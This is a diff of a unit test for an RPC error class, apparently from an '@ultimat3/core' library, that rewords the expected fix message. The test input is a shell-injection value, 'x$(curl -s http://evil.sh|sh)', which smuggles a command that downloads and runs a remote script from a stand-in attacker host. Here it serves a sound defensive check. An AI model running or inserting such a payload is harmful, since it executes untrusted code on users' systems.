@@ -77,7 +77,7 @@ describe('unit · X_RPC_FAILED points at the code that replaced it', () => {
   test("the fix is the wiki's: match X_CLIENT_TRANSPORT_FAILED, nothing a name can reach", () => {
     const error = new RpcFailedError('x$(curl -s http://evil.sh|sh)', 502);
     expect(error.fix).toBe(
-      "match X_CLIENT_TRANSPORT_FAILED instead: isUltimateError(e) && e.code === 'X_CLIENT_TRANSPORT_FAILED', with isUltimateError from @ultimat3/core",
+      "isUltimateError(e) && e.code === 'X_CLIENT_TRANSPORT_FAILED'   // match this instead; isUltimateError from @ultimat3/core",
     );
     expect(error.cause).toContain('evil.sh');
   });
